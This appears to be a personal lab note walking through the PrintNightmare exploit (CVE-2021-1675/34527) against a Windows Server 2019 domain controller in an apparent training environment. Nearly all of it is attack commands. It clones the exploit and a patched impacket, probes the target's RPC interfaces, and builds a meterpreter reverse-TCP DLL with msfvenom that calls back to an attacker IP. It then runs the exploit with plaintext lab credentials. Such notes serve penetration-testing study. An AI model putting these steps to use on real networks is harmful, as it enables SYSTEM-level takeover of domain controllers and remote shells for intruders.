two vulnerabilities ([CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675))
SYSTEM shell session on a Domain Controller running on a Windows Server 2019 host

```shell-session
git clone https://github.com/cube0x0/CVE-2021-1675.git
```

we need cube0x0 version of impacket
```shell-session
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

check if vulnerable
```shell-session
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

create dll payload
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```
host it on a [[SMB Server]] and also start a msf multi/handler

run the exploit
```shell-session
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```
Notice how at the end of the command, we include the path to the share hosting our payload (`\\<ip address of attack host>\ShareName\nameofpayload.dll`)
